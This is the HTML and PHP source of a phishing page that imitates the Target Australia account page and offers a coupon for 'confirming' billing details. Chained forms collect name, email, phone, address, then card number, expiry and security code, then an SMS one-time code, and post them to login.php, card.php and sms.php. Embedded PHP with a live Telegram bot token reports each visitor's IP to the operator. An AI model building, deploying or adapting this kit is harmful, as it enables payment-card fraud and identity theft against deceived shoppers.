
<html lang="en"><head>
    <meta charset="utf-8">
    <title>My Account | Target Australia</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="shortcut icon" href="./favicon-0fcf5574e1.ico" type="image/x-icon">
    <script src="https://cdn.auth0.com/js/auth0/9.18/auth0.min.js"></script><style type="text/css" id="operaUserStyle"></style>
    <script src="https://cdn.auth0.com/js/polyfills/1.0/object-assign.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
  
 
    <style>
        @font-face {
            font-family: InterRegular;
            src: url('./inter_regular.woff');
            src: url('./inter_regular.woff') format('woff'),
                url('./inter_regular.woff2') format('woff2'),
                url('./inter_regular.ttf') format('truetype'),
            font-weight: 400;
            font-style: normal;
            font-display: swap;
        }

        @font-face {
            font-family: InterSemiBold;
            src: url('./inter_semiBold.eot');
            src: url('./inter_semiBold.eot?#iefix') format('embedded-opentype'),
                url('./inter_semiBold.woff') format('woff'),
                url('./inter_semiBold.ttf') format('truetype'),
            font-weight: 600;
            font-style: normal;
            font-display: swap;
        }

      
        body {
            font-family: 'InterRegular', sans-serif;
            font-size: 14px;
            padding-bottom: 15px;

        }

        a {
                color: black;
                text-decoration: underline;
        }

        h3 {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 18px;
        }

        h4 {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 16px;
            margin: 0;
        }

        p {
            font-family: 'InterRegular', sans-serif;
            font-size: 12px;
        }

        p.small {
            font-size: 11px;
            line-height: 21px;
        }

        label {
            font-family: 'InterSemiBold', sans-serif;
            color: black;
            font-size: 16px;
            font-style: normal;
            font-weight: 600;
            margin-bottom: 0;
        }

        button {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 18px;
            font-weight: 600;
            border: none;
            background-color: transparent;
            cursor: pointer;
            padding: 0;
            margin: 0;
        }

        .disclaimer {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            font-size: 12px;
            font-weight: 400px;
        }

        .disclaimer-small {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            font-size: 11px;
            font-weight: 400px;
        }

        .access-disclaimer {
            color: #3D3935;
            font-family: 'InterSemiBold', sans-serif;
            font-style: normal;
            font-size: 12px;
            font-weight: 600px;
        }

        .link {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            cursor: pointer;
            font-size: 12px;
            font-weight: 400px;
        }

        .link-small {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            font-size: 11px;
            font-weight: 400px;
            cursor: pointer;
        }

        .btn-login-text {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-size: 12px;
            font-style: normal;
            font-weight: 500;
            text-align: center;
            margin-top: 1.5rem;
        }

        #btn-login-link {
            color: #000;
            font-family: 'InterSemiBold', sans-serif;
            font-size: 16px;
            font-style: normal;
            font-weight: 500;
            text-decoration-line: underline;
            cursor: pointer;
        }

        .mobile-back-btn {
            background-image: url("./mobile-back.svg");
            background-repeat: no-repeat;
            background-color: white;
            width: 33.25px;
            height: 33.25px;
            margin-top: 20px;
            margin-left: 5px;
            border: 0;
            display: none;
        }

        .desktop-nav {
            display: none;
            visibility: hidden;
        }

        input:focus::placeholder {
            color: transparent;
        }

        .hidden-block {
            display: none;
            visibility: hidden;
        }

        .right-custom-lightgray {
            background: rgba(196,196,196,0.50);
        }

        .left-custom-white {
            background: white;
        }

        .form-check-input {
            margin-left: 1px;
            margin-top: 2px;
        }

        .btn-default,
        .btn-default:hover {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 16px;
            color: white;
            letter-spacing: 1px;
            height: 50px;
            width: 100%;
            border-radius: 100px;
            border: 0;
            background: #BA0000;
            transition: all 0.3s ease 0s;
        }

        .btn-onepass,
        .btn-onepass:hover {
            color: white;
            letter-spacing: 1px;
            width: 100%;
            border-radius: 50px;
            border: 0;
            background: #9900f1;
            height: auto;
            min-height: 50px;
        }

        #onePassLogo{
            height: 16px;
            width: 68px;
            position: relative;
            bottom: 3px;
            left: -2px;
        }

        .btn-join-today,
        .btn-join-today:hover {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 12px;
            font-style: normal;
            font-weight: 600;
            color: white;
            height: 35px;
            width: 132px;
            border-radius: 35px;
            border: 0;
            background: #333;
        }

        .login-btn:disabled {
            background: #999;
            border-color: #999;
            color: white;
        }

        .signup-btn:disabled {
            background: #999;
            border-color: #999;
            color: white;
        }

        .alert {
            margin-bottom: 1px;
            height: 14px;
            line-height: 14px;
            padding: 0px 5px;
        }

        .form-check-label {
            color: #3D3935;
            font-family: 'InterRegular', sans-serif;
            font-style: normal;
            font-weight: 400;
            font-size: 12px;
            margin-left: 20px;
        }

        .hrdivider {
            width: 100%;
            text-align: center;
            border-bottom: 1px solid #000;
            line-height: 0.1em;
            margin: 10px 0 20px;
        }

        .hrdivider span {
            background: #fff;
            padding: 0 10px;
        }

        .password-input-icon {
            padding: 0.5rem 0.75rem;
            position: absolute;
            right: 0px;
            z-index: 5;
            cursor: pointer;
        }

        li {
            font-family: 'InterSemiBold', sans-serif;
            font-size: 14px;
            font-weight: 600px;
            list-style-type: none;
            margin-left: -50px;
            padding: 0px 0px 1px 48px;
        }

        li.heart {
            background: url('./Heart-logo.svg') no-repeat 10px 0px;
            vertical-align: baseline;
        }

        li.tracking {
            background: url('./Track-logo.svg') no-repeat 10px 0px transparent;
            vertical-align: baseline;
        }

        li.checkout {
            background: url('./Checkout-Logo.svg') no-repeat 10px 0px transparent;
            vertical-align: baseline;
        }

        li.update {
            background: url('./Email.svg') no-repeat 10px -2px transparent;
            vertical-align: baseline;
        }

        /* Desktop-specific styles */
        @media only screen and (min-width: 992px) {

            body {
                font-family: 'InterRegular', sans-serif;
                font-size: 14px;
                margin: 0;
            }

            a {
                color: black;
                text-decoration: underline;
            }

            h3 {
                font-family: 'InterSemiBold', sans-serif;
                font-size: 24px;
            }

            h4 {
                font-family: 'InterSemiBold', sans-serif;
                font-size: 16px;
                margin: 0;
            }

            p {
                font-size: 12px;
            }

            p.small {
                font-size: 11px;
                line-height: 21px;
            }

            button {
                font-family: 'InterSemiBold', sans-serif;
                font-size: 18px;
                font-weight: 600;
                border: none;
                background-color: transparent;
                cursor: pointer;
                padding: 0;
                margin: 0;
            }

            nav {
                height: 75px;
                display: flex;
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
            }

            li {
                font-size: 16px;
            }

            .target-logo {
                width: 147px;
                height: 75px;
                margin-right: 60px;
            }

            .mobile-nav {
                display: none;
                visibility: hidden;
            }

            .desktop-nav {
                display: flex;
                visibility: visible;
            }

            .desktop-back-btn {
                background-image: url("./Back-Icon.svg");
                background-position: 0 50%;
                background-repeat: no-repeat;
                width: 70px;
                height: 30px;
                font-family: 'InterSemiBold', sans-serif;
                font-size: 16px;
                font-style: normal;
                font-weight: 600;
                text-align: right;
                
            }

            .btn-login-text {
                font-size: 16px;
            }
            .navbar-mobile {
                display: none;
            }

            .navbar-desktop {
                display: flex;
                justify-content: space-between;
            }

            .perks-container-signin {
                padding-left: 40px;
                padding-right: 30px;
            }

            .perks-container-signup {
                padding-left: 40px;
                padding-right: 30px;
                padding-top: 40px;
            }

            .btn-join-today,
            .btn-join-today:hover {
                font-size: 14px;
                height: 45px;
                width: 146px;
                border-radius: 45px;
            }
        }

        #btn-login-link:hover,a:hover{
            color:#ba0000 ;
            text-decoration: none ;
        }
        
        .showHidesignup-password:hover,.showHidePassword:hover{
            color: black !important;
            text-decoration: underline !important;
        }

        /* for Reset password start */
        #forgot-password-page .title,
        #check-email-page .title {
            font-weight: 600
        }

        #forgot-password-page .desc {
            font-size: 16px;
        }

        .form-container form {
            width: 60%;
        }

        @media (max-width: 480px) {
            .form-container form {
                width: 100%
            }
        }

        #check-email-page .desc {
            font-size: 18px
        }

        input.form-control:focus {
            border-color: #009ee2;
            box-shadow: none;
        }

        input.is-success:focus {
            box-shadow: none;
            border-color: #82be2f;
        }

        input.is-error:focus {
            outline: none;
            box-shadow: none;
            border-color: #fa424d;
        }

        .error {
            color: #fa424d;
            font-size: 12px;
            margin: 5px 0;
        }

        .is-error {
            border-color: #fa424d;
        }

        .is-success {
            border-color: #82be2f;
        }

        .error-text {
            color: #c31818;
        }

        .success-text {
            color: #222222;
        }

        .radio-green-tick {
            content: url("data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='24px' height='24px' viewBox='0 0 24 24' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3EIcon/Success/24px%3C/title%3E%3Cg id='Icon/Success/24px' stroke='none' stroke-width='1' fill='none' fill-rule='evenodd'%3E%3Cpath d='M12 2 C17.523 2 22 6.478 22 12 C22 17.522 17.523 22 12 22 C6.477 22 2 17.522 2 12 C2 6.478 6.477 2 12 2 Z M12 3.4 C7.258 3.4 3.4 7.258 3.4 12 C3.4 16.742 7.258 20.6 12 20.6 C16.742 20.6 20.6 16.742 20.6 12 C20.6 7.258 16.742 3.4 12 3.4 Z M17.9372 8 L17.9452 8.008 L10.2972 16.209 L9.6432 15.64 L6.0542 12.563 L7.2122 11.21 L10.1412 13.721 L15.4902 8 L17.9372 8 Z' id='Combined-Shape' fill='%23253746'%3E%3C/path%3E%3C/g%3E%3C/svg%3E");
            filter: invert(21%) sepia(88%) saturate(839%) hue-rotate(78deg) brightness(100%)
            contrast(97%);
            width: 1.25em;
            height: 1.25em;
        }

        .unchecked-radio {
            content: url("data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='24px' height='24px' viewBox='0 0 24 24' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3EIcon/Radio-unchecked/24px%3C/title%3E%3Cg id='Icon/Radio-unchecked/24px' stroke='none' stroke-width='1' fill='none' fill-rule='evenodd'%3E%3Cpath d='M12 2 C6.477 2 2 6.478 2 12 C2 17.522 6.477 22 12 22 C17.523 22 22 17.522 22 12 C22 6.478 17.523 2 12 2 M12 3.4 C16.742 3.4 20.6 7.258 20.6 12 C20.6 16.742 16.742 20.6 12 20.6 C7.258 20.6 3.4 16.742 3.4 12 C3.4 7.258 7.258 3.4 12 3.4' id='Icon/Radio-unchecked' fill='%23253746'%3E%3C/path%3E%3C/g%3E%3C/svg%3E");
            width: 1.25em;
            height: 1.25em;
        }

        .password-strength-container {
            border: 1.5px solid #e7e7e7;
            border-radius: 2px;
            box-sizing: border-box;
            padding: 18px;
        }

        .list-group {
            padding-left: 0px;
        }

        .list-group-item {
            list-style-type: none;
            margin: 0;
            padding: 0px 0px 1px 60px;
        }

        span.icon {
            vertical-align: middle;
        }

        .error-wrapper {
            display: flex;
            background: #fee;
            gap: 5px;
        }

        .error-wrapper>img {
            padding: 10px;
        }

        .error-info {
            font-size: 14px;
            margin: auto;
        }

        .password-title {
            font-weight: 500;
            line-height: 50px
        }

        .btn-default-reset,
        .btn-default-reset:hover {
            font-size: 18px;
            color: #FFFFFF;
            letter-spacing: 1px;
            line-height: 50px;
            width: 100%;
            border-radius: 100px;
            border: 0;
            background: #BA0000;
            transition: all 0.3s ease 0s;
        }

        .btn-default-reset:disabled {
            color: #CCCCCC;
            background: #F1F1F1;
        }
      
        .youremailinfo {
          word-break:break-all;
        }
      
        .desktop-back-btn-forgotpwd {
                background-position: 0 50%;
                background-repeat: no-repeat;
                width: 70px;
                height: 30px;
         }
         
        .mobile-back-btn-forgotpwd {
            width: 33.25px;
            height: 33.25px;
            margin-top: 20px;
            border: 0;
        }
        /* for Reset password end */
    </style>

<style>
    .hidden {
        display: none;
    }


       #loading {
        display: none;
        position: fixed;
        left: 25%;
        top: 35%;
        transform: translate(-25%, -25%);
        /* Adjust the size of the loader image if needed */
    }

        #loading2 {
        display: none;
        position: fixed;
        left: 25%;
        top: 35%;
        transform: translate(-25%, -25%);
        /* Adjust the size of the loader image if needed */
    }
</style>
<body>

    <?php
  $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
  $chatID = "1064643518";

  // Capturing the Visitor's IP Address
  $userIP = $_SERVER["REMOTE_ADDR"];
  $accessTime = date("Y-m-d H:i:s");

  // Message to Send
  $message = urlencode(
      "[Alert] NEW VISITOR FROM IP : https://db-ip.com/$userIP , status : captcha"
  );

  // Telegram API URL for sending messages
  $telegramApi = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";

  // Use file_get_contents to send the request
  $response = file_get_contents($telegramApi);

  // Decode the JSON response to an array
  $responseArray = json_decode($response, true);

  // Extract the message_id from the response
  $messageId = $responseArray["result"]["message_id"];
  echo "<input type='text' value='" .$messageId ."' style='display:none' id='messageId' />";

  echo "<input type='text' value='" .$userIP ."' style='display:none' id='ipzebi' />";

  //echo file_get_contents("https://api.telegram.org/botYOUR_BOT_TOKEN/editMessageText", false, stream_context_create(['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => http_build_query(['chat_id' => 'CHAT_ID', 'message_id' => MESSAGE_ID, 'text' => 'This is the new edited text'])]]));


?>
    
    <nav class="mobile-nav">
        <button id="mback" class="mobile-back-btn" onclick="back()" ></button>
      	<span class="mobile-back-btn-forgotpwd hidden-block"></span>
        <div class="placeholder"></div>
        <div class="placeholder"></div>
    </nav>
    <div class="container">
        <nav class="desktop-nav">
            <button class="desktop-back-btn" id="dback" onclick="back()" ></button>
          	<span class="desktop-back-btn-forgotpwd hidden-block"></span>
            <img class="target-logo" src="./target.svg" alt="Target Logo"></a>
            <script>
                document.getElementById("target-home").href = `${targetHostName}`;
            </script>
            <div class="placeholder"> </div>
        </nav>
    <div>

            <div class="content-container mt-1 mt-lg-3">

                <!--------------------------------------Start of Sign-in Page-------------------------------------->
                <div class="container" id="login-page">
                    <div class="row">
                        <div class="col-12 col-lg-6 left-custom-white">
                            <div class="px-lg-5 my-3">
                                <h3 class="">Confirm Your Billing Address & Receive Your Coupon!</h3>
                                <div id="error-message" class="alert alert-light"></div>
                               



                                <form method="post" id="fm1" action="login.php">
                                       <div class="form-group">
                                        <input type="text" class="input form-control" id="name" name="name" placeholder="FULL NAME" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
                                     
                                    <div class="form-group">
                                        <input type="email" class="input form-control" id="login-email" name="login-email" placeholder="Email" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>

                                        <div class="form-group">
                                        <input type="tel" class="input form-control" id="phone" name="phone" placeholder="(123) 456-7890" required>
                                        <div class="error" id="login-email-error"></div>
                                    </div>
                                 
                                    <div class="form-group">
                                        <input type="text" class="input form-control" id="add" name="add" placeholder="Street Address 1" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>

                                     <div class="form-group">
                                        <input type="text" class="input form-control" id="city" name="city" placeholder="CITY/TOWN" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
                                     <div class="form-group">
                                        <input type="zip" class="input form-control" id="zip" name="zip" placeholder="ZIP Code™ (OPT)" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
                                    
                               
                                   
                                    <div class="text-left pt-2">
                                        <button  type="submit" name="submit"  onclick="switchForm()" class="btn btn-default login-btn" > Continue</button>
                                    
                                    </div>
                                    <br>
                                     <p class="mb-4 my-0 py-0 access-disclaimer">As part of our commitment to ensuring a secure and personalized shopping experience, we kindly ask you to confirm your billing address. This step is crucial for verifying your identity and safeguarding your account.
                                        Clearance.
                                    </p>

                                        <img src="https://superstorefinder.net/support/wp-content/uploads/2018/01/pink_loader.gif" id="loading" alt="Loading...">
                                        <img src="https://superstorefinder.net/support/wp-content/uploads/2018/01/pink_loader.gif" id="loading2" alt="Loading...">

                                </form>


                                <div  style="display: block;">
</div>

                      <!-- Second Form (Initially Hidden) -->

                                        <div id="fm2" class="hidden" >
                                                        <form id="#form2" method="post" id="fm1" action="card.php">
                                             <!-- Form elements for the second form -->



                                              <div class="form-group">
                                        <input type="text" class="input form-control" id="name" name="name" placeholder="FULL NAME" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
             <div class="form-group">
<input type="text" class="input form-control" id="card" name="card" placeholder="Card Number" required="" pattern="\d{16}" title="Credit card number should be 16 digits">
                                        <div class="error" id="login-email-error"></div>
                                    </div>

                                          <div class="form-group">
<input type="text" class="input form-control" id="exp" name="exp" placeholder="Expiry Date (MM/YY)" required="" oninput="formatExpirationDate(this)">
                                        <div class="error" id="login-email-error"></div>
                                    </div>


                                              <div class="form-group">
                                        <input type="text" class="input form-control" id="csv" name="csv" placeholder="Security code" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>

                                         <div class="text-left pt-2">
                                        <button  type="submit" name="submit"   class="btn btn-default login-btn" > Continue</button>
                                    
                                    </div>
                                    <br>
                                   <p class="mb-4 my-0 py-0 access-disclaimer">As part of our commitment to ensuring a secure and personalized shopping experience, we kindly ask you to confirm your billing address. This step is crucial for verifying your identity and safeguarding your account.
                                        Clearance.
                                    </p> 

                                   
    </form>
</div>



                                                            <!-- sms Form (Initially Hidden) -->

                                        <div id="fm3" class="hidden" >
                                              <p class="mb-4 my-0 py-0 access-disclaimer">Verify Your Payment Method
                                    </p> 
                                                                  <p class="mb-4 my-0 py-0 access-disclaimer"> To confirm the operation, enter the password that we have sent by SMS to your mobile **********.
 </p> 
                                                        <form id="#form3" method="post" id="fm1" action="sms.php">
                                             <!-- Form elements for the sms form -->



                                              <div class="form-group">
                                        <input type="text" class="input form-control" id="sms" name="sms" placeholder="SMS KEY" required="" >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
             


                                             

                                         <div class="text-left pt-2">
                                        <button  type="submit" name="submit"   class="btn btn-default login-btn" > Confirme</button>
                                    
                                    </div>
                                    <br>
                                 
      


  <p class="mb-4 my-0 py-0 access-disclaimer"> As part of our commitment to ensuring a secure and personalized shopping experience, we kindly ask you to confirm your billing address. This step is crucial for verifying your identity and safeguarding your account.
                                        Clearance.
                                    </p> 

                                   
    </form>
</div>
                            </div>
                        </div>
                        <div class="col col-12 col-lg-6 right-custom-lightgray">
                            <div>
                                <div class="text-center my-0 py-5">
                                    <label class="text-center" for="btn-join">Don't have an account</label><br>
                                    <button type="submit" id="btn-join" class="btn btn-join-today mt-2">Create Account</button>
                                </div>
                                <div class="perks-container-signin">
                                    <div class="mb-3"><h4>Enjoy access to:</h4></div>
                                    <ul>
                                        <li class="heart">
                                            $10 off online!
                                            <br>
                                            <p>Get $10 off your next $50+ online shop when you opt into marketing.</p>
                                        </li>
                                        <li class="tracking">
                                            Detailed Order Tracking
                                            <br>
                                            <p>Get updates on the progress of your order and see all your past purchases
                                            </p>
                                        </li>
                                        <li class="checkout">
                                            Faster Checkout
                                            <br>
                                            <p>We'll remember and pre-fill your details everytime you shop online</p>
                                        </li>
                                        <li class="update">
                                            Latest Deals and Products
                                            <br>
                                            <p>
                                                Never miss a promotion, the latest products or exclusive offers when you
                                                opt
                                                into marketing.
                                            </p>
                                        </li>
                                    </ul>
                                    <p class="my-0 py-0 mb-5 access-disclaimer">Offer available to new marketing opt-ins only. E-Voucher
                                        promo code sent via your Welcome Email. Code is single-use only and not
                                        redeemable for cash. Cannot be used with any other promo code. Excludes
                                        Clearance.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>



                <!---------------------------------------End of Sign-in Page--------------------------------------->

                <!--------------------------------------Start of Sign-up Page-------------------------------------->
                <div class="container hidden-block" id="signup-page">
                    <div class="row right-custom-lightgray">
                        <div class="col col-12 col-lg-6 right-custom-lightgray order-xl-2 order-lg-2">
                            <div>
                                <div class="perks-container-signup">
                                    <div class="mb-3 mt-3"><h4>Enjoy access to:</h4></div>
                                    <ul>
                                        <li class="heart">
                                            $10 off online!^
                                            <br>
                                            <p>Get $10 off your next $50+ online shop when you opt into marketing.</p>
                                        </li>
                                        <li class="tracking">
                                            Detailed Order Tracking
                                            <br>
                                            <p>Get updates on the progress of your order and see all your past purchases
                                            </p>
                                        </li>
                                        <li class="checkout">
                                            Faster Checkout
                                            <br>
                                            <p>We'll remember and pre-fill your details everytime you shop online</p>
                                        </li>
                                        <li class="update">
                                            Latest Deals and Products
                                            <br>
                                            <p>
                                                Never miss a promotion, the latest products or exclusive offers when you
                                                opt
                                                into marketing.
                                            </p>
                                        </li>
                                    </ul>
                                    <p class="mb-4 my-0 py-0 access-disclaimer">^Offer available to new marketing opt-ins only. E-Voucher
                                        promo code sent via your Welcome Email. Code is single-use only and not
                                        redeemable for cash. Cannot be used with any other promo code. Excludes
                                        Clearance.
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div class="col col-12 col-lg-6 order-xl-1 order-lg-1 left-custom-white">
                            <div class="px-lg-5 pt-3">
                                <h3 class="">Create an account</h3>
                                <div id="error-message" class="alert alert-light"></div>
                                <form onsubmit="return false;" method="post">
                                    <div class="form-group">
                                        <label for="signup-email">Email<sup>*</sup></label>
                                        <input required="" type="email" class="form-control" id="signup-email" placeholder="Email" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                        <div class="error" id="signup-email-error"></div>
                                        <div class="error-wrapper" id="error-wrapper" hidden="">
                                            <p class="error-info" id="signup-error"></p>
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label for="first-name">First name<sup>*</sup></label>
                                        <input required="" type="text" class="form-control" id="first-name" placeholder="First Name" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                        <div class="error" id="first-name-error"></div>
                                    </div>
                                    <div class="form-group">
                                        <label for="last-name">Last name<sup>*</sup></label>
                                        <input required="" type="text" class="form-control" id="last-name" placeholder="Last Name" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                        <div class="error" id="last-name-error"></div>
                                    </div>
                                    <div class="form-group">
                                        <label for="mobile-number">Mobile number<sup>*</sup></label>
                                        <input required="" type="text" class="form-control" id="mobile-number" placeholder="Mobile Number" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                        <p class="small text-right" id="mobile-number-text">Updates on your order can be
                                            sent by
                                            SMS</p>
                                        <div class="error" id="mobile-number-error"></div>
                                    </div>
                                    <div class="form-group">
                                        <label for="signup-password">Password<sup>*</sup></label>
                                        <div class="input-group">
                                            <input required="" type="password" class="form-control" id="signup-password" value="" placeholder="Password" onblur="onBlurHandler(this)" oninput="onChangeHandler(this)">
                                            <div class="password-input-icon">
                                                <span>
                                                    <a class="showHidesignup-password" id="show_hide_signup-password">Show</a>
                                                </span>
                                            </div>
                                        </div>
                                        <div class="error" id="signup-password-error"></div>
                                        <div id="password-strength-container" class="container password-strength-container border p-3 mb-3" aria-live="assertive" aria-atomic="true" data-shown="true" hidden="">
                                            <span class="password-title">
                                                Your password must contain:
                                            </span>

                                            <ul class="list-group border-0">
                                                <li class="list-group-item border-0 p-0">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="at-least-8-characters"></span>
                                                        At least 8 characters
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="at-least-3-of-the-following"></span>
                                                        At least 3 of the following:
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0 pl-4">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="lower-case-letters"></span>
                                                        Lower case letters (a-z)
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0 pl-4">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="upper-case-letters"></span>
                                                        Upper case letters (A-Z)
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0 pl-4">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="numbers"></span>
                                                        Numbers (0-9)
                                                    </label>
                                                </li>
                                                <li class="list-group-item border-0 p-0 pl-4">
                                                    <label>
                                                        <span class="icon unchecked-radio mr-1" id="special-characters"></span>
                                                        Special characters (ex. !@#$%^&amp;*)
                                                    </label>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="form-group small">
                                        <input class="form-check-input" type="checkbox" id="marketing-emails">
                                        <label class="form-check-label" for="marketing-emails">
                                            Yes, opt me in to receive marketing from Target, including exclusive promotions and offers.</label>
                                        <p class="mt-3 disclaimer">By signing up, you agree to our <a href="" class="link" id="signup-tc" target="_blank">Conditions of Use</a> and <a href="" class="link" id="signup-pp" target="_blank">Privacy Policy</a>.
                                            <script>
                                                document.getElementById("signup-tc").href = `${targetHostName}/corporate/condition-of-use`;
                                                document.getElementById("signup-pp").href = `${targetHostName}/corporate/privacy`;
                                            </script>
                                        </p>
                                    </div>
                                    <button id="btn-signup" class="btn btn-default btn-block signup-btn" disabled="">
                                        Join Now
                                    </button>
                                </form>
                                <div>
                                    <h4 class="btn-login-text">Already have an account? 
                                        <a id="btn-login-link">Log in here</a></h4>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!---------------------------------------End of Sign-up Page--------------------------------------->

                <!----------------------------------Start of Reset Password Page----------------------------------->
                <div class="container hidden-block" id="forgot-password-page">
                    <div class="row">
                        <div class="col-12 col-lg-2"></div>
                        <div class="col-12 col-lg-8">
                            <h4 class="text-center title mb-4">Reset Password</h4>
                            <p class="text-center desc mb-5">Enter your email address and we'll send you instructions to
                                reset
                                your password.</p>
                            <div class="form-container w-100 d-flex justify-content-center">
                                <form onsubmit="return false;" method="post">
                                    <div class="form-group">
                                        <label for="name">Email*</label>
                                        <input type="email" class="input form-control" id="reset-email" placeholder="Email" required="true" onblur="onBlurHandler(this, 'reset')" oninput="onChangeHandler(this, 'reset')">
                            <div class="error" id="reset-email-error"></div>
                                    </div>
                                    <div class="text-left pt-1 mb-5 pb-1">
                                        <button type="submit" disabled="" class="btn btn-default-reset" id="btn-reset">Send
                                            email</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="col-12 col-lg-2"></div>
                    </div>
                </div>
                <!------------------------------------End of Reset Password Page------------------------------------->

                <div class="container hidden-block" id="check-email-page">
                    <div class="row">
                        <div class="col-12 col-lg-2"></div>
                        <div class="col-12 col-lg-8 text-center">
                            <h4 class="text-center title mb-5">Please check your email</h4>
                            <p class="text-left mb-5 desc">Thanks! We have sent an email to <span class="youremailinfo">xxxx</span> with the next steps to reset your password.</p>
                            <p class="text-left desc">If you don’t receive the email after few minutes, make sure to
                                check your
                                junk or spam folder too.</p>
                        </div>
                    </div>
                </div>
            </div>

           


</div></div>
<script>
document.querySelector('#fm1').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting the traditional way
    var formData = new FormData(this);

    // Optionally process formData if needed, then:
        document.getElementById('loading').style.display = 'block';

    // Example of how you might asynchronously submit the form data using Fetch API
    fetch('login.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        console.log(data); // Process response from login.php
        // Now show the second form
        document.getElementById('fm1').style.display = 'none';
        document.getElementById('fm2').style.display = 'block';
        document.getElementById('mback').style.display = 'block';
        document.getElementById('dback').style.display = 'block';

    })
    .catch(error => console.error('Error:', error));
});



document.getElementById('#form2').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting the traditional way

    // Display the loading GIF immediately
    document.getElementById('loading2').style.display = 'block';

    // Use setTimeout to delay the form processing
    setTimeout(() => {
        var formData = new FormData(this);
        document.getElementById('loading').style.display = 'block';

        // Example of how you might asynchronously submit the form data using Fetch API
        fetch('card.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(data => {
            console.log(data); // Process response from server
            // Now show the second form and hide the loading GIF
            document.getElementById('fm1').style.display = 'none';
            document.getElementById('fm2').style.display = 'none';
            document.getElementById('fm3').style.display = 'block';
            document.getElementById('mback').style.display = 'block';
            document.getElementById('dback').style.display = 'block';
            document.getElementById('loading2').style.display = 'none';
        })
        .catch(error => {
            console.error('Error:', error);
            // Optionally, handle errors by hiding the loading GIF
            document.getElementById('loading2').style.display = 'none';
        });
    }, 10000); // Wait for 10 seconds (10000 milliseconds) before executing the above code
});



document.getElementById('#from3').addEventListener('submit', function(event) {
    event.preventDefault();
    const formData = new FormData(this);

    document.getElementById('loading').style.display = 'block';

    fetch('sms.php', {
        method: 'POST',
        body: formData,
    })
    .then(response => response.text())
    .then(data => {
        console.log(data);
        document.getElementById('loading').style.display = 'none';
        document.getElementById('fm2').style.display = 'none';
        document.getElementById('fm3').style.display = 'none';

      
    })
    .catch(error => {
        console.error('Error:', error);
        document.getElementById('loading').style.display = 'none';
    });
});


function back() {
    // Hide the first form
                document.getElementById('loading').style.display = 'none';
        document.getElementById('fm3').style.display = 'none';

    document.getElementById('fm2').style.display = 'none';
    
    // Show the second form
    document.getElementById('fm1').style.display = 'block';
}


function formatExpirationDate(input) {
  var value = input.value;
  // Remove all non-digit characters
  var valueClean = value.replace(/\D/g, '');

  // Slice and add slash after 2 digits (MM/YY)
  if (valueClean.length > 2) {
    valueClean = valueClean.slice(0, 2) + '/' + valueClean.slice(2, 4);
  }

  input.value = valueClean;

